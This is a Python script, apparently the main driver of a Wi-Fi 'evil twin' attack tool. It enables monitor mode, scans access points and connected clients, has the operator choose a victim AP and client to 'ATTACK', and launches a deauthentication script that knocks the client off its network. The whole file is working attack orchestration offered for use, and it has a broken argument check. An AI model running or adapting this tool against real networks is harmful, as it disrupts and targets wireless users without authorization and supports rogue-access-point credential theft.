from numpy import empty
import sniff_ap as sniffAP
import sniff_clients as sniffCL
import mode

import os
import sys
import time


if sys.argv[1] is empty:
    print("Usage ERROR, expect - sudo python3 EvilTwin.py <interface_name>")
    print("Enter the interface name of you wireless card please.")
    exit(1)
interface = sys.argv[1]

if __name__ == '__main__':
    
    

    
    os.system("clear")
    print("Evil-Twin Process has STARTED...")
    os.system("sudo airmon-ng check kill")
    time.sleep(2)
    mode.monitor(interface)
    
    
    time.sleep(3)
    # Sniffing Access Points..
    sniffAP.start(interface)
    print("    \n\n\n    ")
    for i in range(len(sniffAP.AP_LIST)):
        print("index [{0}] -> {1}".format(i, sniffAP.AP_LIST[i]))
    
    
    time.sleep(0.5)
    # Choosing 1 of the AP as A Victim
    index = int(input(" Choose an Access Point to ATTACK -   "))
    mac_ap = sniffAP.AP_LIST[index][sniffAP.BSSID]
    channel = sniffAP.AP_LIST[index][sniffAP.CHANNEL]
    
    time.sleep(3)
    # Sniffing Clients connecting to the Chosen AP
    sniffCL.start(interface, mac_ap, channel)
    for i in range(len(sniffCL.CL_LIST)):
        print("index [{0}] -> {1}".format(i, sniffCL.CL_LIST[i]))
    
    # Choosing 1 of the Clients as A Victim
    print(" When choosing a client the attack will start immediately ")
    index = int(input(" Choose an Client to ATTACK -   "))
    client_mac = sniffCL.CL_LIST[index]
    time.sleep(1)

    # Disconnect the client from the AP 
    os.system("python3 deauth.py " +client_mac+" "+mac_ap)
    
    mode.manage(interface)
